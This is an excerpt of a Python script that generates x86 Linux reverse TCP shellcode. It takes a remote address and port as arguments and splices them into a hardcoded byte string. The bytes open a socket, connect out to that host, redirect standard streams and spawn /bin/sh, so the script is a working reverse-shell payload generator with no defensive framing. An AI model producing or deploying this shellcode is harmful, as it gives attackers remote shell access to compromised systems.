...
#
#    generate_shellcode_reverse_tcp.py - Generate the shellcode with the correct port in
...
def main(argc, argv):
    ...
    parser.add_argument('-p', '--p', dest='port',
                        help='specify the port of remote host', required=True)

    parser.add_argument('-a', '--a', dest='address',
                        help='specify the address of remote host', required=True)
    ...
    # take ipadress and render as hex value
    ...
    shellcode = "\x31\xdb\xf7\xe3\x6a\x66\x58\x43\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\x6a\x66\x58\x43\x52\x68" \
                + struct.pack('>I', int(ip, 16)) + "\x66\x68" + struct.pack('>H', int(args.port)) + \
                "\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\x43\xcd\x80\x87\xf3\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9" \
                "\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
